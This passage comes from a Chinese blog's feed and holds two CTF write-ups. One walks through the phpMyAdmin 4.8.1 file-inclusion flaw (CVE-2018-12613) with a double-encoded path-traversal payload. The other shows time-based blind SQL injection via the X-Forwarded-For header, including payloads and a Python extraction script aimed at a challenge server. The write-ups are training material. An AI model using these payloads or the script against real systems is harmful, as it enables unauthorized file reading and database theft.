                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##不能为空</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##是字符串</span>
        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##上面checkfile返回为true</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token delimiter">?></span></code></pre>
<p>hint.php</p>
<pre class=" language-PHP"><code class="language-PHP">flag not here, and flag in ffffllllaaaagggg</code></pre>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:<br><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code><br>传入得到flag</p>
<p>具体为啥这么构造，参考下面的漏洞。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p>
<h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p>
<p>$_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p>
<p>$_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>   在index.php里50-63行</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// If we have a valid target, let's load that script instead</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，<strong><em>Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件</em></strong></p>
<p>代码在libraries\classes\Core.php 443-476行</p>
<p>Core::checkPageValidity</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$_page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>mb_substr:截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取<br>而就在这里出现了漏洞<br><strong>构造payload:</strong><br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说传入的数据里没？<br>所以这时的<strong>$page</strong>没被截取，<strong>$_page</strong>的值依然等于<strong>$page</strong><br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的</p>
<p>参考：</p>
<p>[]: <a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">https://www.jianshu.com/p/0d75017c154f</a></p>
<p><strong>持续更新</strong></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>BUUCTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>insert into</title>
    <url>/2019/08/24/insert%20into/</url>
    <content><![CDATA[<img src="/2019/08/24/insert%20into/1-01.png" srcset="/img/loading.gif" title="image">

<p>观察题目</p>
<img src="/2019/08/24/insert%20into/1-02.png" srcset="/img/loading.gif" title="image">

<p>可以看到注入点应该在http头的x-forwarded-for上</p>
<a id="more"></a>

<img src="/2019/08/24/insert%20into/1-03.png" srcset="/img/loading.gif" title="image">

<p>这里还把‘，’过滤了</p>
<img src="/2019/08/24/insert%20into/1-04.png" srcset="/img/loading.gif" title="image">

<p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p>
<p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p>
<img src="/2019/08/24/insert%20into/1-05.png" srcset="/img/loading.gif" title="image">

<p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p>
<img src="/2019/08/24/insert%20into/1-06.png" srcset="/img/loading.gif" title="image">

<p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p>
<pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python

<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
mystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>
url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
<span class="token comment" spellcheck="true">#查库名</span>
data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span>
<span class="token comment" spellcheck="true">#查表名</span>
data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span>
<span class="token comment" spellcheck="true">#查字段名</span>
data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span>
<span class="token comment" spellcheck="true">#查出来是 flag</span>
<span class="token comment" spellcheck="true">#查内容</span>
data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>
          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>
          flag <span class="token operator">+=</span> j
          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
          <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre>
<p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
</search>
